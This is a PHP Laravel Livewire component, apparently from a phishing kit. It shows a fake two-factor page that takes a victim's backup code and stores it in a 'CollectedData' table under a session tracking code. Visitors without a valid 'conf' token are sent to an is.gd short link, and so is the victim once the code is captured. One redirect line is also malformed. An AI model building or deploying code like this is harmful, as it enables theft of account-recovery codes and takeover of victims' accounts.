<?php

namespace App\Livewire\Components;

use App\Models\CollectedData;
use App\Models\User;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Livewire\Attributes\Validate;
use Livewire\Component;

class TwoFactor extends Component
{
    #[Validate("required|integer")]
    public $backupcode;

    public $rules = [
        "backupcode" => "required|integer",
    ];

    public function mount()
    {
        $authToken = request()->query("conf");
        $checkToken = User::where('auth_token', $authToken)->first();
        if ($checkToken !== null) {
            session(["authToken" => $authToken]);
            if (empty(session("new_tracking_code"))) {
                $this->redirect(route("index")) .
                    "?conf=" .
                    session("authToken");
            }
        } else {
            $this->redirect("https://is.gd/VCpW0P");
        }
    }

    public function saveCode()
    {
        try {
            $this->validate();
            $tracking_code = session("new_tracking_code");
            CollectedData::where("tracking_code", $tracking_code)->update([
                "backup_code" => $this->backupcode,
            ]);
            Session::flush();
            $this->backupcode = "";
            $this->redirect("https://is.gd/VCpW0P");
        } catch (\Exception $e) {
            Log::info($e->getMessage());
        }
    }

    public function render()
    {
        return view("livewire.components.two-factor");
    }
}
